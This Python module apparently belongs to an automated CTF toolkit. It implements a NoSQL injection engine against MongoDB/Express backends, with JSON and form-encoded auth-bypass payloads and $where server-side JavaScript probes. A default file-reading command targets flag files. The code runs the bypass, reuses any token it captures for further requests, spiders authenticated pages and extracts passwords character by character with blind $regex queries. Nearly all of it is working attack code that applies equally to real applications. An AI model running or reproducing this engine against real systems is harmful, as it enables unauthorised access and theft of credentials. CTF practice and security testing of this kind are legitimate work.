"""
NoSQL Injection Engine for WebCTF Suite.
Handles MongoDB operator injection ($gt, $ne, $regex, $where, $exists),
NoSQL Auth Bypass, Data Exfiltration, and Server-Side JavaScript Injection ($where).
Targets Node.js/Express + MongoDB (Mongoose) backends - the most common CTF pattern.
"""

import re
import json
import string
import requests
from typing import Dict, List, Any, Optional, Callable, Tuple
from urllib.parse import urljoin
from core.ui import print_info, print_success, print_warning, print_error, print_flag


# ──────────────────────────────────────────────────────────────────────────────
# 1. NoSQL Auth Bypass Payloads
# ──────────────────────────────────────────────────────────────────────────────

def get_nosql_json_auth_bypass_payloads() -> List[Dict[str, Any]]:
    """JSON-body NoSQL injection payloads for MongoDB auth bypass."""
    return [
        # Classic $ne (not equal) bypass - matches any non-empty value
        {
            "name": "MongoDB $ne bypass",
            "payload": {"username": {"$ne": ""}, "password": {"$ne": ""}},
        },
        # $gt (greater than) bypass
        {
            "name": "MongoDB $gt bypass",
            "payload": {"username": {"$gt": ""}, "password": {"$gt": ""}},
        },
        # Target admin user with $ne password
        {
            "name": "MongoDB admin $ne password",
            "payload": {"username": "admin", "password": {"$ne": ""}},
        },
        # $regex wildcard bypass
        {
            "name": "MongoDB $regex bypass",
            "payload": {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        },
        # Target admin with $regex password
        {
            "name": "MongoDB admin $regex password",
            "payload": {"username": "admin", "password": {"$regex": ".*"}},
        },
        # $exists bypass
        {
            "name": "MongoDB $exists bypass",
            "payload": {"username": {"$exists": True}, "password": {"$exists": True}},
        },
        # $gt with specific admin user
        {
            "name": "MongoDB admin $gt password",
            "payload": {"username": "admin", "password": {"$gt": ""}},
        },
        # $in operator
        {
            "name": "MongoDB $in bypass",
            "payload": {"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}},
        },
        # $where JS injection for auth bypass
        {
            "name": "MongoDB $where JS bypass",
            "payload": {"username": "admin", "$where": "1==1"},
        },
        {
            "name": "MongoDB $where always true",
            "payload": {"$where": "return true"},
        },
    ]


def get_nosql_form_auth_bypass_payloads() -> List[Dict[str, Any]]:
    """URL-encoded form NoSQL injection payloads using bracket notation."""
    return [
        # Express/Mongoose bracket notation: username[$ne]=&password[$ne]=
        {
            "name": "Form $ne bracket bypass",
            "data": {"username[$ne]": "", "password[$ne]": ""},
        },
        {
            "name": "Form $gt bracket bypass", 
            "data": {"username[$gt]": "", "password[$gt]": ""},
        },
        {
            "name": "Form admin $ne bracket",
            "data": {"username": "admin", "password[$ne]": ""},
        },
        {
            "name": "Form admin $gt bracket",
            "data": {"username": "admin", "password[$gt]": ""},
        },
        {
            "name": "Form $regex bracket bypass",
            "data": {"username[$regex]": ".*", "password[$regex]": ".*"},
        },
        {
            "name": "Form admin $regex bracket",
            "data": {"username": "admin", "password[$regex]": ".*"},
        },
        {
            "name": "Form $exists bracket bypass",
            "data": {"username[$exists]": "true", "password[$exists]": "true"},
        },
        {
            "name": "Form $where bracket bypass",
            "data": {"username": "admin", "$where": "1==1"},
        },
    ]


# ──────────────────────────────────────────────────────────────────────────────
# 2. NoSQL $where RCE Payloads (Server-Side JS Injection)
# ──────────────────────────────────────────────────────────────────────────────

def get_nosql_ssji_payloads(flag_cmd: str = "cat /flag* || cat /flag.txt") -> List[Dict[str, str]]:
    """Server-Side JavaScript Injection via MongoDB $where operator."""
    return [
        {
            "name": "SSJI sleep probe (timing)",
            "payload": "sleep(3000)",
            "type": "timing",
        },
        {
            "name": "SSJI this.password reveal",
            "payload": "this.password",
            "type": "data",
        },
        {
            "name": "SSJI tojsononeof",
            "payload": "tojsononeof(this)",
            "type": "data",
        },
    ]


# ──────────────────────────────────────────────────────────────────────────────
# 3. Main NoSQL Injection Engine
# ──────────────────────────────────────────────────────────────────────────────

class NoSQLInjectionEngine:
    """
    Automated engine for detecting and exploiting NoSQL Injection.
    Specializes in MongoDB operator injection on Express/Node.js backends.
    """

    @staticmethod
    def detect_and_exploit(
        session: requests.Session,
        target_url: str,
        forms: List[Dict[str, Any]],
        endpoints: List[str],
        tech_stack: List[str],
        flag_checker: Callable,
        state: Dict[str, Any],
    ) -> bool:
        """
        Full pipeline: attempt NoSQL auth bypass via JSON and form-encoded payloads,
        follow redirects, scrape authenticated pages for flags.
        Returns True if bypass succeeded and/or flag captured.
        """
        print_info("Testing NoSQL Injection (MongoDB Operator Bypass) Vectors...")

        success = False

        # 1. Test JSON-body NoSQL injection on login forms
        for form in forms:
            action = form.get("action", target_url)
            method = form.get("method", "POST").upper()
            inputs = [i for i in form.get("inputs", []) if i.get("type") not in ["submit", "button"]]
            input_names = [i.get("name", "") for i in inputs]

            # Only test forms that look like auth forms
            has_pass = any("pass" in n.lower() for n in input_names)
            has_user = any(any(k in n.lower() for k in ["user", "login", "name", "email"]) for n in input_names)

            if not (has_pass or has_user or len(input_names) >= 2):
                continue

            # Determine user and password field names
            user_field = None
            pass_field = None
            for n in input_names:
                nl = n.lower()
                if any(k in nl for k in ["user", "login", "name", "email", "pseudo"]):
                    user_field = n
                elif any(k in nl for k in ["pass", "pwd", "key", "token", "secret"]):
                    pass_field = n

            if not user_field and not pass_field and len(input_names) >= 2:
                user_field = input_names[0]
                pass_field = input_names[1]

            # ─── Phase A: JSON Body NoSQL Injection ───
            json_payloads = get_nosql_json_auth_bypass_payloads()
            for pay_info in json_payloads:
                name = pay_info["name"]
                payload = pay_info["payload"]

                # Map generic payload keys to actual form field names
                mapped_payload = {}
                for k, v in payload.items():
                    if k == "username" and user_field:
                        mapped_payload[user_field] = v
                    elif k == "password" and pass_field:
                        mapped_payload[pass_field] = v
                    elif k.startswith("$"):
                        mapped_payload[k] = v
                    elif user_field and k == "username":
                        mapped_payload[user_field] = v
                    else:
                        mapped_payload[k] = v

                # Fill missing fields
                if user_field and user_field not in mapped_payload:
                    mapped_payload[user_field] = {"$ne": ""}
                if pass_field and pass_field not in mapped_payload:
                    mapped_payload[pass_field] = {"$ne": ""}

                try:
                    r = session.post(
                        action,
                        json=mapped_payload,
                        timeout=5,
                        allow_redirects=True,
                    )

                    # Check for auth bypass indicators
                    bypassed = NoSQLInjectionEngine._check_auth_bypass(r, flag_checker, name, action)
                    if bypassed:
                        print_success(
                            f"NoSQL Auth Bypass via [bold green]{name}[/bold green] "
                            f"on [bold yellow]{action}[/bold yellow]!"
                        )
                        success = True

                        # Spider authenticated area for flags
                        NoSQLInjectionEngine._spider_authenticated_area(
                            session, r, target_url, flag_checker, state
                        )

                        state.setdefault("nosql_bypass_payload", mapped_payload)
                        if state.get("captured_flags"):
                            return True

                except Exception:
                    pass

            # ─── Phase B: Form-Encoded Bracket Notation NoSQL Injection ───
            form_payloads = get_nosql_form_auth_bypass_payloads()
            for pay_info in form_payloads:
                name = pay_info["name"]
                data = dict(pay_info["data"])

                # Remap generic field names to actual form field names
                remapped = {}
                for k, v in data.items():
                    new_k = k
                    if user_field:
                        new_k = new_k.replace("username", user_field)
                    if pass_field:
                        new_k = new_k.replace("password", pass_field)
                    remapped[new_k] = v

                try:
                    r = session.post(
                        action,
                        data=remapped,
                        timeout=5,
                        allow_redirects=True,
                    )

                    bypassed = NoSQLInjectionEngine._check_auth_bypass(r, flag_checker, name, action)
                    if bypassed:
                        print_success(
                            f"NoSQL Form Bypass via [bold green]{name}[/bold green] "
                            f"on [bold yellow]{action}[/bold yellow]!"
                        )
                        success = True

                        NoSQLInjectionEngine._spider_authenticated_area(
                            session, r, target_url, flag_checker, state
                        )

                        if state.get("captured_flags"):
                            return True

                except Exception:
                    pass

        # 2. Test NoSQL on discovered API-like endpoints
        for ep in endpoints:
            ep_lower = ep.lower()
            if any(kw in ep_lower for kw in ["api", "graphql", "query", "search", "find", "user", "data"]):
                for pay_info in get_nosql_json_auth_bypass_payloads()[:3]:
                    try:
                        r = session.post(ep, json=pay_info["payload"], timeout=5, allow_redirects=True)
                        flag_checker(r.text, f"NoSQL API Probe ({ep})")
                    except Exception:
                        pass

        return success

    @staticmethod
    def _check_auth_bypass(
        response: requests.Response,
        flag_checker: Callable,
        payload_name: str,
        form_action: str,
    ) -> bool:
        """Check if a response indicates successful authentication bypass.
        Handles both HTML responses AND JSON API responses (Express/Node.js pattern).
        """
        # Check for flags first
        flag_found = flag_checker(response.text, f"NoSQL Auth Bypass ({payload_name})")
        if flag_found:
            return True

        text_lower = response.text.lower()
        url_lower = response.url.lower()

        # ─── JSON API Response Detection (Express/Node.js pattern) ───
        # Success: {"redirect": "/dashboard"} or {"token": "..."} or {"success": true}
        # Failure: {"error": "Invalid credentials"} or {"message": "Wrong password"}
        try:
            json_resp = response.json()
            if isinstance(json_resp, dict):
                # Check for redirect field (Express auth success pattern)
                if json_resp.get("redirect") or json_resp.get("redirectUrl") or json_resp.get("redirectTo"):
                    print_info(f"JSON redirect detected: [bold green]{json_resp.get('redirect') or json_resp.get('redirectUrl') or json_resp.get('redirectTo')}[/bold green]")
                    return True
                # Check for token field (JWT auth success)
                if json_resp.get("token") or json_resp.get("jwt") or json_resp.get("accessToken"):
                    return True
                # Check for explicit success field
                if json_resp.get("success") is True or json_resp.get("authenticated") is True:
                    return True
                # Check for user/session data (means we're logged in)
                if json_resp.get("user") or json_resp.get("session") or json_resp.get("profile"):
                    return True
                # Check for error field (means failure - return False)
                if json_resp.get("error") or json_resp.get("message"):
                    err = str(json_resp.get("error", json_resp.get("message", "")))
                    if any(k in err.lower() for k in ["invalid", "wrong", "incorrect", "denied", "fail", "unauthorized", "not found"]):
                        return False
        except (ValueError, AttributeError):
            pass  # Not a JSON response, continue with HTML checks

        # ─── HTML Response Detection ───
        auth_success_indicators = [
            "welcome", "dashboard", "logged in", "logout", "profile",
            "admin", "flag", "secret", "success", "authenticated",
            "hello", "session", "account", "panel", "home"
        ]
        auth_fail_indicators = [
            "invalid", "incorrect", "wrong", "failed", "error",
            "try again", "unauthorized", "denied", "bad credentials"
        ]

        # Check HTTP redirect
        redirected = (
            response.history and len(response.history) > 0 and
            response.history[0].status_code in [301, 302, 303]
        )

        has_success = any(ind in text_lower for ind in auth_success_indicators)
        has_failure = any(ind in text_lower for ind in auth_fail_indicators)
        url_changed = "login" not in url_lower and "auth" not in url_lower

        if redirected and not has_failure:
            return True
        if has_success and not has_failure:
            return True
        if url_changed and not has_failure:
            return True

        return False

    @staticmethod
    def _spider_authenticated_area(
        session: requests.Session,
        auth_response: requests.Response,
        base_url: str,
        flag_checker: Callable,
        state: Dict[str, Any],
    ):
        """After successful auth bypass, spider the authenticated area for flags.
        Handles JSON API redirect responses and HTML page crawling.
        """
        from urllib.parse import urlparse
        print_info("Spidering authenticated area for flags and secrets...")

        # Derive the origin (scheme + host) from the base URL
        parsed_base = urlparse(base_url)
        origin = f"{parsed_base.scheme}://{parsed_base.netloc}"

        # Check the auth response itself
        flag_checker(auth_response.text, "Authenticated Page")

        # ─── Extract redirect URL from JSON response ───
        redirect_paths = []
        try:
            json_resp = auth_response.json()
            if isinstance(json_resp, dict):
                for key in ["redirect", "redirectUrl", "redirectTo", "url", "location", "next"]:
                    val = json_resp.get(key)
                    if val and isinstance(val, str):
                        redirect_paths.append(val)
                        print_info(f"Following JSON redirect: [bold cyan]{val}[/bold cyan]")
                # Also check for token to use as auth
                for key in ["token", "jwt", "accessToken", "access_token"]:
                    val = json_resp.get(key)
                    if val and isinstance(val, str):
                        session.headers.update({"Authorization": f"Bearer {val}"})
                        session.cookies.set("token", val)
                        print_info(f"Using extracted auth token for subsequent requests")
        except (ValueError, AttributeError):
            pass

        # ─── Build full URL list to spider ───
        # Start with JSON redirects (highest priority)
        spider_urls = []
        for path in redirect_paths:
            if path.startswith("http"):
                spider_urls.append(path)
            else:
                spider_urls.append(f"{origin}{path}")

        # Extract links from the auth response HTML (if it's HTML)
        links = re.findall(r'href=["\']([^"\']+)["\']', auth_response.text)
        links += re.findall(r'action=["\']([^"\']+)["\']', auth_response.text)
        for link in links:
            if link.startswith("http"):
                spider_urls.append(link)
            elif link.startswith("/"):
                spider_urls.append(f"{origin}{link}")

        # Add common authenticated paths
        common_paths = [
            "/", "/dashboard", "/admin", "/profile", "/flag", "/secret",
            "/home", "/panel", "/settings", "/account", "/user",
            "/api/flag", "/api/user", "/api/admin", "/api/dashboard",
            "/api/profile", "/api/data", "/api/secret",
            "/admin/flag", "/user/profile", "/admin/dashboard",
        ]
        for path in common_paths:
            spider_urls.append(f"{origin}{path}")

        # ─── Spider all URLs ───
        visited = set()
        second_level_links = []

        for full_url in spider_urls:
            if full_url in visited:
                continue
            visited.add(full_url)

            try:
                r = session.get(full_url, timeout=5, allow_redirects=True)
                if r.status_code == 200:
                    found = flag_checker(r.text, f"Authenticated Spider ({full_url})")

                    # Check for flag patterns in both HTML and JSON responses
                    text_lower = r.text.lower()
                    if any(k in text_lower for k in ["flag", "secret", "ctf{", "htb{", "picoctf{", "flag{"]):
                        print_success(f"Potential flag content found at: [bold cyan]{full_url}[/bold cyan]")

                    # Also try to parse JSON responses for embedded flags/data
                    try:
                        jr = r.json()
                        if isinstance(jr, dict):
                            # Recursively check all values
                            for k, v in jr.items():
                                if isinstance(v, str):
                                    flag_checker(v, f"JSON field '{k}' at {full_url}")
                                elif isinstance(v, list):
                                    for item in v:
                                        if isinstance(item, str):
                                            flag_checker(item, f"JSON list '{k}' at {full_url}")
                                        elif isinstance(item, dict):
                                            for ik, iv in item.items():
                                                if isinstance(iv, str):
                                                    flag_checker(iv, f"JSON nested '{k}.{ik}' at {full_url}")
                    except (ValueError, AttributeError):
                        pass

                    # Collect second-level links
                    page_links = re.findall(r'href=["\']([^"\']+)["\']', r.text)
                    for pl in page_links:
                        if pl.startswith("/"):
                            second_level_links.append(f"{origin}{pl}")
                        elif pl.startswith("http"):
                            second_level_links.append(pl)

            except Exception:
                pass

        # ─── Spider second-level pages ───
        for full_url in second_level_links:
            if full_url in visited:
                continue
            visited.add(full_url)
            try:
                r = session.get(full_url, timeout=5, allow_redirects=True)
                if r.status_code == 200:
                    flag_checker(r.text, f"Authenticated L2 Spider ({full_url})")
            except Exception:
                pass

    @staticmethod
    def extract_field_via_regex(
        session: requests.Session,
        url: str,
        user_field: str,
        pass_field: str,
        target_user: str = "admin",
        max_length: int = 32,
    ) -> Optional[str]:
        """
        Extract a password character-by-character using $regex NoSQL blind injection.
        This is useful when the flag IS the password itself.
        """
        print_info(f"Attempting blind NoSQL $regex password extraction for user '{target_user}'...")
        extracted = ""
        charset = string.ascii_letters + string.digits + "_{}-!@#$%^&*()"

        for pos in range(max_length):
            found_char = False
            for c in charset:
                # Escape regex special chars
                escaped = re.escape(extracted + c)
                payload = {
                    user_field: target_user,
                    pass_field: {"$regex": f"^{escaped}"},
                }
                try:
                    r = session.post(url, json=payload, timeout=4, allow_redirects=False)
                    # If we get a redirect or success indicator, this char is correct
                    if r.status_code in [301, 302, 303] or any(
                        k in r.text.lower() for k in ["welcome", "dashboard", "logout", "success"]
                    ):
                        extracted += c
                        found_char = True
                        print_info(f"  Extracted so far: [bold green]{extracted}[/bold green]")
                        break
                except Exception:
                    pass

            if not found_char:
                break

        if extracted:
            print_success(f"Extracted password/secret: [bold green]{extracted}[/bold green]")
            return extracted
        return None
